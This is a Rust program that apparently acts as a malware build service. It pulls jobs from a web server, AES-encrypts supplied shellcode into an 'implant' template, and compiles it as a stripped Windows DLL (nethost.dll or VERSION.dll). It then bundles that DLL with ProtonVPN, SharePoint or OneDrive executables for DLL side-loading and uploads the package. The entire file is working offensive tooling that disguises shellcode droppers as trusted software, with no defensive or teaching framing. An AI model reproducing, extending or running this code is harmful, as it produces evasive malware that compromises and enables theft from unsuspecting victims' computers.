use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use rand::{thread_rng, Rng};
use reqwest::Client;
use reqwest::multipart::{Form, Part};
use serde::Deserialize;
use serde_json::Value;
use std::fs;
use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::process::Command;
use tokio::time::{sleep, Duration};
use zip::write::FileOptions;
use zip::ZipWriter;
use hex;

// Define the Build struct to match the JSON structure
#[derive(Debug, Deserialize)]
struct Build {
    id: Option<i32>,
    build_id: Option<String>,
    side_loading: Option<String>,
    shellcode: Option<String>,
    to_build: Option<i32>,
    payload: Option<String>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let url = "http://webserver/build/back_get.php"; // Replace with the correct URL
    let result_url = "http://webserver/build/build_result.php"; // URL to post results

    loop {
        // Send a POST request
        let response = match client.post(url).send().await {
            Ok(resp) => resp,
            Err(err) => {
                eprintln!("Failed to send request: {}", err);
                sleep(Duration::from_secs(1)).await;
                continue;
            }
        };

        let response_json: Value = match response.json().await {
            Ok(json) => json,
            Err(err) => {
                eprintln!("Failed to parse JSON response: {}", err);
                sleep(Duration::from_secs(1)).await;
                continue;
            }
        };

        // Check if the response contains an error
        if response_json.get("error").is_some() {
            eprintln!("Error: {}", response_json["error"].as_str().unwrap_or("Unknown error"));
            sleep(Duration::from_secs(1)).await;
            continue;
        } else {
            // Decode the response into a list of Build structs
            let builds: Vec<Build> = match serde_json::from_value(response_json) {
                Ok(builds) => builds,
                Err(err) => {
                    eprintln!("Failed to decode builds: {}", err);
                    sleep(Duration::from_secs(1)).await;
                    continue;
                }
            };

            // Process each build
            for build in builds {
                println!("{:?}", build);

                let build_id = match &build.build_id {
                    Some(id) => id,
                    None => {
                        eprintln!("Missing build_id");
                        continue;
                    }
                };

                // Determine the base file to use based on side_loading value
                let base_filename = match build.side_loading.as_deref() {
                    Some("protonvpn") => "protonvpn_base.rs",
                    Some("sharepoint") => "sharepoint_base.rs",
                    Some("onedrive") => "onedrive_base.rs",
                    _ => {
                        eprintln!("Unknown or missing side_loading value");
                        continue; // Skip this build if the side_loading value is unknown
                    }
                };

                // Determine the DLL file to use based on side_loading value
                let dll_filename = match build.side_loading.as_deref() {
                    Some("protonvpn") => "nethost.dll",
                    Some("sharepoint") => "VERSION.dll",
                    Some("onedrive") => "VERSION.dll",
                    _ => {
                        eprintln!("Unknown or missing side_loading value for DLL");
                        continue; // Skip this build if the side_loading value for DLL is unknown
                    }
                };

                // Determine the executable file to copy based on side_loading value
                let exe_filename = match build.side_loading.as_deref() {
                    Some("protonvpn") => "ProtonVPN.exe",
                    Some("sharepoint") => "SharePoint.exe",
                    Some("onedrive") => "OneDrive.exe",
                    _ => {
                        eprintln!("Unknown or missing side_loading value for executable");
                        continue; // Skip this build if the side_loading value for executable is unknown
                    }
                };

                println!("exe_filename: {}", exe_filename);

                // Create the full path to the base file
                let lib_base_path_str = format!("/implant/implant/src/{}", base_filename);
                let lib_base_path = Path::new(&lib_base_path_str);

                // Check if the base file exists
                if !lib_base_path.exists() {
                    eprintln!("Base file not found: {}", lib_base_path.display());
                    continue;
                }

                // Read the content of the selected base file
                let lib_base_content = match fs::read_to_string(lib_base_path) {
                    Ok(content) => content,
                    Err(err) => {
                        eprintln!("Failed to read base file {}: {}", lib_base_path.display(), err);
                        continue;
                    }
                };

                let shellcode_content = match base64::decode(build.shellcode.clone().unwrap_or_default()) {
                    Ok(content) => content,
                    Err(err) => {
                        eprintln!("Failed to decode shellcode: {}", err);
                        continue;
                    }
                };

                // Generate a random key and IV
                let key = generate_random_key();
                let iv = generate_random_iv();

                // Encrypt shellcode with AES-256
                let cipher_shellcode_content = encrypt(&shellcode_content, &key, &iv);
                println!("Encrypted (Hex): {}", cipher_shellcode_content);

                let lib_content = lib_base_content
                    .replace("{{shellcode}}", &cipher_shellcode_content)
                    .replace("{{key}}", &hex::encode(&key))
                    .replace("{{iv}}", &hex::encode(&iv));

                // Write the modified content to lib.rs
                let lib_path = Path::new("/implant/implant/src/lib.rs");
                if let Err(err) = fs::write(lib_path, lib_content) {
                    eprintln!("Failed to write lib.rs: {}", err);
                    continue;
                }

                // Compile the lib.rs file as a DLL
                let implant_compile_command = Command::new("cargo")
                    .args(&[
                        "rustc",
                        "--crate-type",
                        "cdylib",
                        "--manifest-path",
                        "/implant/implant/Cargo.toml",
                        "--target",
                        "x86_64-pc-windows-gnu",
                        "--release",
                        "--",
                        "-Cdebuginfo=0",
                        "-Cstrip=symbols",
                        "-Cpanic=abort",
                        "-Copt-level=3",
                    ])
                    .output()?;

                if implant_compile_command.status.success() {
                    println!("Compilation successful");

                    // Path to the compiled DLL file
                    let dll_path = Path::new("/implant/implant/target/x86_64-pc-windows-gnu/release/implant.dll");

                    // Check if the DLL file exists
                    if !dll_path.exists() {
                        eprintln!("Compiled DLL file not found: {}", dll_path.display());
                        continue;
                    }

                    // Create the full path to the executable file
                    let exe_path_str = format!("/implant/implant/payload/exe/{}", exe_filename);
                    let exe_path = Path::new(&exe_path_str);

                    // Check if the executable file exists
                    if !exe_path.exists() {
                        eprintln!("Executable file not found: {}", exe_path.display());
                        continue;
                    }

                    // Create a ZIP file name based on side_loading value
                    let zip_file_name = format!("{}.zip", build.side_loading.clone().unwrap_or_else(|| "default".to_string()));
                    let zip_file_path_str = format!("/implant/implant/payload/{}", zip_file_name);
                    let zip_file_path = Path::new(&zip_file_path_str);

                    // Create the ZIP file and add the DLL and executable to it
                    let file = match File::create(&zip_file_path) {
                        Ok(file) => file,
                        Err(err) => {
                            eprintln!("Failed to create ZIP file {}: {}", zip_file_path.display(), err);
                            continue;
                        }
                    };

                    let mut zip = ZipWriter::new(file);
                    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);

                    // Add the DLL to the ZIP
                    if let Err(err) = zip.start_file(dll_filename, options) {
                        eprintln!("Failed to start ZIP entry for DLL: {}", err);
                        continue;
                    }
                    let mut buffer = Vec::new();
                    let mut file = match File::open(&dll_path) {
                        Ok(file) => file,
                        Err(err) => {
                            eprintln!("Failed to open DLL file {}: {}", dll_path.display(), err);
                            continue;
                        }
                    };
                    if let Err(err) = file.read_to_end(&mut buffer) {
                        eprintln!("Failed to read DLL file {}: {}", dll_path.display(), err);
                        continue;
                    }
                    if let Err(err) = zip.write_all(&buffer) {
                        eprintln!("Failed to write DLL to ZIP: {}", err);
                        continue;
                    }

                    // Add the executable to the ZIP
                    if let Err(err) = zip.start_file(exe_filename, options) {
                        eprintln!("Failed to start ZIP entry for executable: {}", err);
                        continue;
                    }
                    buffer.clear(); // Clear buffer before reusing
                    let mut file = match File::open(&exe_path) {
                        Ok(file) => file,
                        Err(err) => {
                            eprintln!("Failed to open executable file {}: {}", exe_path.display(), err);
                            continue;
                        }
                    };
                    if let Err(err) = file.read_to_end(&mut buffer) {
                        eprintln!("Failed to read executable file {}: {}", exe_path.display(), err);
                        continue;
                    }
                    if let Err(err) = zip.write_all(&buffer) {
                        eprintln!("Failed to write executable to ZIP: {}", err);
                        continue;
                    }

                    if let Err(err) = zip.finish() {
                        eprintln!("Failed to finish ZIP file: {}", err);
                        continue;
                    }

                    println!("{} created successfully", zip_file_name);

                    // Send the ZIP file to the server
                    let file_content = match fs::read(&zip_file_path) {
                        Ok(content) => content,
                        Err(err) => {
                            eprintln!("Failed to read ZIP file {}: {}", zip_file_path.display(), err);
                            continue;
                        }
                    };

                    // Create a Part from the file content
                    let file_part = Part::bytes(file_content).file_name(zip_file_name);

                    let form = Form::new()
                        .part("file", file_part)
                        .text("build_id", build_id.clone());

                    let response = match client.post(result_url).multipart(form).send().await {
                        Ok(resp) => resp,
                        Err(err) => {
                            eprintln!("Failed to send ZIP file: {}", err);
                            continue;
                        }
                    };

                    if response.status().is_success() {
                        println!("{:?}", response);
                    } else {
                        eprintln!("Upload failed for build_id: {}: {}", build_id, response.status());
                    }
                } else {
                    eprintln!("Compilation failed: {}", String::from_utf8_lossy(&implant_compile_command.stderr));
                }
            }
        }

        // Wait for 1 second before the next request
        sleep(Duration::from_secs(1)).await;
    }
}

fn generate_random_key() -> [u8; 32] {
    let mut rng = thread_rng();
    let mut key = [0u8; 32];
    rng.fill(&mut key);
    key
}

fn generate_random_iv() -> [u8; 16] {
    let mut rng = thread_rng();
    let mut iv = [0u8; 16];
    rng.fill(&mut iv);
    iv
}

fn encrypt(text: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> String {
    let cipher = Cbc::<Aes256, Pkcs7>::new_from_slices(key, iv).unwrap();
    let ciphertext = cipher.encrypt_vec(text);
    hex::encode(ciphertext)
}
